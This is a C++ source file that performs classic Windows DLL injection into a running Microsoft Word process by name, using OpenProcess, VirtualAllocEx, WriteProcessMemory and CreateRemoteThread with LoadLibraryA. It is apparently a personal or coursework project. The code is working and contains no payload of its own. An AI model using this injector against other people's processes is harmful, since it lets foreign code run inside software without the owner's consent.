#include <windows.h>
#include <tlhelp32.h>

//Dll-Injection made by ID

// Function to get process ID by its name
DWORD GetProcessIdByName(const wchar_t* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    const wchar_t* processName = L"WINWORD.EXE";  // Replace with your target process name
    const char* dllPath = "C:\\Users\\dalal\\Desktop\\Private Projects\\os\\mydll\\x64\\Debug\\mydll.dll"; // Replace with your dll path

    // Get full path of DLL to inject
    DWORD pathLen = GetFullPathNameA(dllPath, 0, NULL, NULL);
    char* fullPath = new char[pathLen];
    GetFullPathNameA(dllPath, pathLen, fullPath, NULL);

    // Get LoadLibrary function address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");

    // Get the target process ID
    DWORD procID = GetProcessIdByName(processName);
    if (procID == 0) {
        // Process not found
        return 0;
    }

    // Open remote process
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
    if (NULL == proc) {
        DWORD err = GetLastError();
        return 0;
    }

    // Get a pointer to memory location in the remote process
    PVOID memAddr = VirtualAllocEx(proc, NULL, pathLen, MEM_COMMIT, PAGE_READWRITE);
    if (NULL == memAddr) {
        DWORD err = GetLastError();
        CloseHandle(proc);
        return 0;
    }

    // Write DLL name to remote process memory
    BOOL check = WriteProcessMemory(proc, memAddr, fullPath, pathLen, NULL);
    if (0 == check) {
        DWORD err = GetLastError();
        VirtualFreeEx(proc, memAddr, 0, MEM_RELEASE);
        CloseHandle(proc);
        return 0;
    }

    // Open remote thread, while executing LoadLibrary with the parameter DLL name
    HANDLE hRemote = CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, memAddr, 0, NULL);
    if (NULL == hRemote) {
        DWORD err = GetLastError();
        VirtualFreeEx(proc, memAddr, 0, MEM_RELEASE);
        CloseHandle(proc);
        return 0;
    }

    WaitForSingleObject(hRemote, INFINITE);
    CloseHandle(hRemote);
    VirtualFreeEx(proc, memAddr, 0, MEM_RELEASE);
    CloseHandle(proc);

    delete[] fullPath;

    return 0;
}
